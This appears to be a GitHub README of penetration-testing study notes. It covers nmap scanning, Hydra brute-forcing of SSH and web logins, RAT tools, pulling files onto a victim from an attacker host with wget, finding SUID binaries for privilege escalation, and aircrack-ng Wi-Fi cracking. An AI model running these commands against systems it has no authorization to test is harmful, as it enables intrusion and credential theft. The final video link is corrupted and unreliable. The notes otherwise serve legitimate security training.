# OffSec-Notes
Repository created for keeping notes on various topics, vulnerabilities and tools useful in penetration testing. 

# Reconnaissance

### Some Common Ports

 Port     | Service  | Protocol          |
| --------|:--------:| -----------------:|
| 21      | FTP      |    TCP, UDP, SCTP |
| 22      | SSH      |    TCP, UDP, SCTP |
| 137     | NetBIOS  |    TCP, UDP       |
| 161     | SNMP     |    UDP            |
| 445     | SMB      |    TCP, UDP       |
| 3389    | RDP      |    TCP            |

<details open>
<summary>nmap</summary>

```sudo nmap -sn 192.168.0.0/24``` - Check for hosts only, disable port scan (-sn).

```sudo nmap -sn --exclude [IP] 192.168.0.0/24``` - Check for hosts only, disable port scan (-sn), exclude a specific url (--exclude).

```nmap -sT [IP]``` - Use TCP connect scan (-sT) if not root/sudo user. Only option for non sudoers.

```sudo nmap [IP] ``` -  By default nmap uses TCP SYN scan (-sS), but this should be used only from root/sudo user.

```sudo nmap -sV -O -v [IP] -p- -oN [Filename.txt]``` - Default SYN scan with enabled version detection (-sV) and OS detection (-O). Additional flags - verbose mode (-v), all ports (-p-), output to .txt file (-oN). 

```sudo nmap -A [IP]``` - Default SYN scan with enabled OS detection, version detection, script scanning, and traceroute (-A).

```sudo nmap --script http-methods [IP]``` - Default SYN scan with specific script (--script). As an example script *http-methods* (enumerates allowed HTTP methods) is used.

```sudo nmap -sU [IP]``` - Performs UDP scan (-sU).

```-n``` - Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. Since DNS can be slow even with Nmap's built-in parallel stub resolver, this option reduces scanning times.

Useful nmap scripts:

 Script   | Service  | Description |
|:--------|:--------|:-----------|
| smb-os-discovery.nse    | SMB (445)  | Enumerate OS, domain name,etc. |
| smb-enum-users.nse      | SMB (445)  | Used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing. |
| smb-enum-shares.nse     | SMB (445)  | SMB shares. |
| nbstat.nse     | NetBIOS (137)  | NetBIOS enumeration, use -sU for UDP. |

</details>

# Brute-force
<details open>
<summary>Hydra</summary>

```sudo hydra -l <username> -P <wordlist> [URL] ssh``` - Basic Hydra command for brute-forcing ssh password. Works similarly with other protocols such as FTP.

```sudo hydra -l <username> -P <wordlist> [base_URL] http-post-form "<path>:<login_credentials>:<invalid_response>"``` - Hydra command for HTTP POST form. Path need to be specified seperately from base URL.

</details>

# Malware Threats

<details>
<summary>RAT's</summary>

You need to target the right IP and port number (try default first).
You need to use the right tool from the available.

Example tools to establish a connection to a RAT:
- njRAT
- MoSucker
- ProRat
- Theef
- HTTP RAT

</details>

<details>
<summary>Malware Analysis Tools</summary>

https://www.hybrid-analysis.com/ - Online tool.

**DIE (Detect it Easy)** - Scan and analyze .elf files.

**PE Explorer** - Find entry point address.

</details>

# Traffic Sniffing
<details open>
<summary>Wireshark</summary>

```tcp.flags.syn==1``` - Filter apply example, this one searches for SYN packets.

Follow streams to check for interesting data. Rightclick on packet -> Follow -> TCP Stream (can be other protocols).

To check for files in the conversations use export option. File -> Export -> HTTP (can be other protocol) -> sort by content-type to see if there are any .txt files for example.

**To followup on something like a DoS or DDoS attack go into Statistics -> Conversations and sort by packet count or bytes sent.**

![image](https://github.com/MaxLazerhawk/OffSec-Notes/assets/53828427/b0417cc6-a20b-450a-bce0-4588031e210e)


### View capture file properties to look for comments.
![image](https://github.com/MaxLazerhawk/OffSec-Notes/assets/53828427/39f702e0-c213-457b-9695-cb336a4488b9)

**IOT** ```mqtt``` to filter mqtt trafic. Publish message might be important.

</details>

# Transfering Files

```python3 -m http.server 9000``` - Set up HTTP server on attacjubg machine.

```wget http://[ATTACKING_IP]:9000/[filename]``` - Use on victim machine to download.

OR use SCP, SFTP or FTP protocols.

```scp /path/to/local/file.txt <user>@$IP:$PORT:/path/to/remote/``` - SCP file transfer example.

# Finding Files on Linux

```find . -name flag1.txt``` - find the file named “flag1.txt” in the current directory.

```find /home -name flag1.txt``` - find the file names “flag1.txt” in the /home directory.

```find / -type d -name config``` - find the directory named config under “/”.

```find / -type f -perm 0777``` - find files with the 777 permissions (files readable, writable, and executable by all users).

```find / -perm a=x``` - find executable files.

```find /home -user frank``` - find all files for user “frank” under “/home”.

```find / -mtime 10``` - find files that were modified in the last 10 days.

```find / -atime 10``` - find files that were accessed in the last 10 day.

```find / -cmin -60``` - find files changed within the last hour (60 minutes).

```find / -amin -60``` - find files accesses within the last hour (60 minutes).

```find / -size 50M``` - find files with a 50 MB size.

------
    
```find / -writable -type d 2>/dev/null``` - Find world-writeable folders.

```find / -perm -222 -type d 2>/dev/null``` - Find world-writeable folders.

```find / -perm -o w -type d 2>/dev/null``` - Find world-writeable folders.

------

```find / -perm -o x -type d 2>/dev/null``` - Find world-executable folders.

------

```find / -perm -u=s -type f 2>/dev/null``` - Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 



# Wireless Attacks
<details>
<summary>aircrack-ng</summary>
Used to crack .cap files. WEP, WPA/WPA2 wireless networks.

```aircrack-ng [filename].cap```

- Works for WEP.
- If the capture file has sufficient packets aircrack will be able to crack it.

```aircrack-ng [filename].cap -w [file]``` 

- Works for WPA.
- Dictionary added (-w).

</details>

# Useful Links

### Notes:

https://github.com/infovault-Ytube/CEH-Practical-Notes

https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master

https://github.com/TheCyberpunker/CEH-Practical-Notes

https://chirag-singla.notion.site/chirag-singla/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052

https://ceh-practical.cavementech.com/

https://infosecwriteups.com/privileges-escalation-techniques-basic-to-advanced-in-linux-973cb62cbe8d

### Tool Documentation:

https://github.com/horsicq/Detect-It-Easy

### Videos

https://www.youtube.com/watch?v=VuIYNxazbN0&list=PLZEA2EJpqSWfouVNPkl37AWEVCj6A2mdz&index=9

https://www.youtube.com/watch?v=4JzLg7wjHm8&list=PL-Fa25Pu8l6wV1Se-bPY-Onc6t_mUTZHW

https://www.youtube.com/watch?v=`x31mz'|F='op!'!jmA|
